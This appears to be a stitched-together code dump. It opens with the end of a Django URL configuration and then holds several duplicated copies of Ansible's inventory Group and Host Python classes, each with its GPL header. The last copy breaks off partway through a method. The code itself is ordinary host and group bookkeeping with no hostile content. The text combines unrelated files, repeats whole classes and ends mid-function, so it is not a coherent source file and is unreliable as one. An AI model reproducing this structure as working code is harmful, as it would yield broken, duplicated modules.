        url(r'^orders/$', orders.OrderList.as_view(), name='event.orders'),
        url(r'^attendees/$', attendees.AttendeeList.as_view(), name='event.attendees'),
    ])),
    url(r'^help/(?P<topic>[^.]+)$', help.HelpView.as_view(), name='help'),                    
]

# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception("can't add group to itself")

        # don't add if it's already there
        if group not in self.child_groups:
            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])                    

            # update the depth of the grandchildren
            group._check_children_depth()                    

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors()                    

            self.clear_hosts_cache()

    def _check_children_depth(self):

        try:                    
            for group in self.child_groups:                    
                group.depth = max([self.depth + 1, group.depth])                    
                group._check_children_depth()                    
        except RuntimeError:                    
            raise AnsibleError("The group named '%s' has a recursive dependency loop." % self.name)                    

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.parent_groups:                    
            g.clear_hosts_cache()                    

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.child_groups:                    
            kid_hosts = kid.get_hosts()                    
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def _get_ancestors(self):                    

        results = {}                    
        for g in self.parent_groups:                    
            results[g.name] = g                    
            results.update(g._get_ancestors())                    
        return results                    

    def get_ancestors(self):                    

        return self._get_ancestors().values()                    

    def set_priority(self, priority):
        try:                    
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass

# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:                    
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self):                    
        # populate ancestors
        for group in self.groups:                    
            self.add_group(group)                    

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.add_group(oldg)                    

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())

# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception("can't add group to itself")

        # don't add if it's already there
        if group not in self.child_groups:
            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])                    

            # update the depth of the grandchildren
            group._check_children_depth()                    

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors()                    

            self.clear_hosts_cache()

    def _check_children_depth(self):

        try:                    
            for group in self.child_groups:                    
                group.depth = max([self.depth + 1, group.depth])                    
                group._check_children_depth()                    
        except RuntimeError:                    
            raise AnsibleError("The group named '%s' has a recursive dependency loop." % self.name)                    

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.parent_groups:                    
            g.clear_hosts_cache()                    

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.child_groups:                    
            kid_hosts = kid.get_hosts()                    
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def _get_ancestors(self):                    

        results = {}                    
        for g in self.parent_groups:                    
            results[g.name] = g                    
            results.update(g._get_ancestors())                    
        return results                    

    def get_ancestors(self):                    

        return self._get_ancestors().values()                    

    def set_priority(self, priority):
        try:                    
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass

# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:                    
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self):                    
        # populate ancestors
        for group in self.groups:                    
            self.add_group(group)                    

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.add_group(oldg)                    

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())

# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception("can't add group to itself")

        # don't add if it's already there
        if group not in self.child_groups:
            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])                    

            # update the depth of the grandchildren
            group._check_children_depth()                    

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors()                    

            self.clear_hosts_cache()

    def _check_children_depth(self):

        try:                    
            for group in self.child_groups:                    
                group.depth = max([self.depth + 1, group.depth])                    
                group._check_children_depth()                    
        except RuntimeError:                    
            raise AnsibleError("The group named '%s' has a recursive dependency loop." % self.name)                    

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.parent_groups:                    
            g.clear_hosts_cache()                    

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.child_groups:                    
            kid_hosts = kid.get_hosts()                    
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def _get_ancestors(self):                    

        results = {}                    
        for g in self.parent_groups:                    
            results[g.name] = g                    
            results.update(g._get_ancestors())                    
        return results                    

    def get_ancestors(self):                    

        return self._get_ancestors().values()                    

    def set_priority(self, priority):
        try:                    
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass

# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:                    
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self):                    
        # populate ancestors
        for group in self.groups:                    
            self.add_group(group)                    

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.add_group(oldg)                    

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())

# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception("can't add group to itself")

        # don't add if it's already there
        if group not in self.child_groups:
            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])                    

            # update the depth of the grandchildren
            group._check_children_depth()                    

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors()                    

            self.clear_hosts_cache()

    def _check_children_depth(self):

        try:                    
            for group in self.child_groups:                    
                group.depth = max([self.depth + 1, group.depth])                    
                group._check_children_depth()                    
        except RuntimeError:                    
            raise AnsibleError("The group named '%s' has a recursive dependency loop." % self.name)                    

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.parent_groups:                    
            g.clear_hosts_cache()                    

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.child_groups:                    
            kid_hosts = kid.get_hosts()                    
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def _get_ancestors(self):                    

        results = {}                    
        for g in self.parent_groups:                    
            results[g.name] = g                    
            results.update(g._get_ancestors())                    
        return results                    

    def get_ancestors(self):                    

        return self._get_ancestors().values()                    

    def set_priority(self, priority):
        try:                    
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass

# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:                    
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self):                    
        # populate ancestors
        for group in self.groups:                    
            self.add_group(group)                    

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.add_group(oldg)                    

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())

# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception("can't add group to itself")

        # don't add if it's already there
        if group not in self.child_groups:
